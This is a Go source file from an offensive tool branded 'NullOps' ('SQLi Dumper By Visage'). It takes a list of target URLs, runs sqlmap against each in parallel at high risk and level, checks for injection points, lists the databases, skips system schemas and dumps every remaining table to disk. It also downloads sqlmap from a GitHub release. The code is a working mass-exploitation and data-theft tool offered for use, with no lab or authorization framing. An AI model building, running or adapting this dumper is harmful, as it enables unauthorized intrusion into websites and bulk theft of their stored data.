package Dumpers

import (
	"NullOps/CLI_Handlers"
	"NullOps/Helpers"
	"NullOps/Interface"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"
)

const (
	sqlMapPath = "sqlmap/sqlmap.py"
	outputDir  = "./Dumped"
)

type SQLMapConfig struct {
	URL   string
	Risk  string
	Level string
}

func constructSQLMapCommand(config SQLMapConfig, additionalArgs ...string) *exec.Cmd {
	baseArgs := []string{
		"python", sqlMapPath, "-u", config.URL, "--risk", config.Risk, "--level", config.Level,
		"--smart", "--batch", "-o", "--output-dir", outputDir,
	}

	for i, arg := range additionalArgs {
		additionalArgs[i] = Helpers.SanitizeString(arg)
	}

	if len(additionalArgs) == 0 {
		fmt.Println("Warning: No valid arguments passed.")
		return nil
	}

	return exec.Command(baseArgs[0], append(baseArgs[1:], additionalArgs...)...)
}

func runSQLMapCommand(config SQLMapConfig, additionalArgs ...string) (string, error) {
	cmd := constructSQLMapCommand(config, additionalArgs...)
	cmdOutput, err := cmd.CombinedOutput()
	if err != nil {
		return string(cmdOutput), fmt.Errorf("error running SQLMap: %w", err)
	}
	return string(cmdOutput), nil
}

func extractItemsFromOutput(output, regexPattern string) []string {
	databaseRegex := regexp.MustCompile(regexPattern)
	matches := databaseRegex.FindAllStringSubmatch(output, -1)
	var databaseNames []string
	undesiredNames := map[string]bool{
		"Mysql":              true,
		"Performance_schema": true,
		"Sys":                true,
		"Test":               true,
		"information_schema": true,
		"starting":           true,
		"ending":             true,
	}

	for _, match := range matches {
		databaseName := match[1]
		if !undesiredNames[databaseName] {
			databaseNames = append(databaseNames, databaseName)
		}
	}

	return databaseNames
}

func ExtractDomain(inputURL string) string {
	parsedURL, err := url.Parse(inputURL)
	if err != nil {
		return inputURL
	}
	return parsedURL.Hostname()
}

func isURLVulnerable(config SQLMapConfig) (bool, error) {
	output, err := runSQLMapCommand(config)
	if err != nil {
		return false, err
	}
	return strings.Contains(output, "sqlmap identified the following injection point(s)") || strings.Contains(output, "sqlmap resumed the following injection point(s) from stored session"), nil
}

func checkSetup() {
	if Helpers.IsPythonInstalled() {
		if Helpers.DirectoryExists("sqlmap") {
			return
		} else {
			Interface.Clear()
			Interface.Gradient("SQLMap directory does not exist.")
			Interface.Gradient("Installing please wait....")

			err := Helpers.DownloadAndExtractFile("https://github.com/9dl/NullOps-Suite/releases/download/sqlmap/sqlmap.zip", "./")
			if err != nil {
				Interface.Gradient(fmt.Sprintf("Error: %v\n", err))
			} else {
				Interface.Gradient("Download and extraction completed successfully.")
				Interface.Gradient("Please restart application.")
				_, err = fmt.Scanln()
				CLI_Handlers.LogError(err)
				os.Exit(0)
			}

			_, err = fmt.Scanln()
			CLI_Handlers.LogError(err)
			os.Exit(0)
		}
	} else {
		Interface.Clear()
		Interface.Gradient("Python is not installed on this system.")
		_, err := fmt.Scanln()
		CLI_Handlers.LogError(err)
		os.Exit(0)
	}
}

func SQLiDumper() {
	checkSetup()
	Dumped, Failed, Empty, Targetable_Tables, checked, total = 0, 0, 0, 0, 0, 0
	Helpers.Running = true
	Interface.Clear()

	FilePath := CLI_Handlers.GetFilePath()
	urls, err := CLI_Handlers.ReadLines(FilePath)
	CLI_Handlers.LogError(err)

	defer func() {
		Helpers.Running = false
	}()

	threadCount := 10
	risk := 3
	level := 3
	sQLMap := 3
	Interface.Option("?", "Threads")
	Interface.Input()
	_, err = fmt.Scanln(&threadCount)
	CLI_Handlers.LogError(err)

	Interface.Option("?", "Level (1/10)")
	Interface.Input()
	_, err = fmt.Scanln(&level)
	CLI_Handlers.LogError(err)

	Interface.Option("?", "Risk (1/3)")
	Interface.Input()
	_, err = fmt.Scanln(&risk)
	CLI_Handlers.LogError(err)

	Interface.Option("?", "SQLMap Threads (1/10)")
	Interface.Input()
	_, err = fmt.Scanln(&sQLMap)
	CLI_Handlers.LogError(err)

	Interface.Clear()
	Interface.Gradient("SQLi Dumper By Visage (NullOps)")

	go func() {
		if Helpers.Running == true {
			Interface.DumperTitle("NullOps", Dumped, Failed, Empty, checked, total)
			time.Sleep(1 * time.Second)
		} else {
			return
		}
	}()
	defer func() {
		Helpers.Running = false
	}()

	Helpers.Threading(func(site string) {
		config := SQLMapConfig{URL: site, Risk: strconv.Itoa(risk), Level: strconv.Itoa(level)}
		vulnerable, err := isURLVulnerable(config)
		if err != nil {
			//fmt.Println(err)
			return
		}
		if !vulnerable {
			Interface.Option(ExtractDomain(site), "URL is not Vulnerable.")
			return
		}
		Interface.Valid("URL is Vulnerable!")
		dbsOutput, err := runSQLMapCommand(config, "--dbs")
		if err != nil {
			//fmt.Println(err)
			return
		}
		dbs := extractItemsFromOutput(dbsOutput, `\[\*\] (\w+)`)
		Interface.Option(ExtractDomain(site), "Getting all DB")
		for _, db := range dbs {
			Interface.Option(ExtractDomain(site), "Getting Tables from "+db)
			tablesOutput, err := runSQLMapCommand(config, "--tables", "-D", db)
			if err != nil {
				fmt.Println(err)
				continue
			}
			tables := extractItemsFromOutput(tablesOutput, `| (\w+) |`)
			Interface.Option(ExtractDomain(site), fmt.Sprintf("DB: %v -> Total Tabes: %v", db, len(tables)))

			tables = Helpers.CleanTableNames(tables)

			Interface.Title(fmt.Sprintf("Url: %v | Current Process -> %v", site, "Dumping Tables"))
			output, err := runSQLMapCommand(config, "-D", db, "--tables", strings.Join(tables, ","), "--dump", "--threads", strconv.Itoa(sQLMap))
			if err != nil {
				fmt.Println(err)
			}
			fmt.Println(output)
		}
		mu.Lock()
		Helpers.Checked++
		mu.Unlock()
	}, threadCount, urls)
}
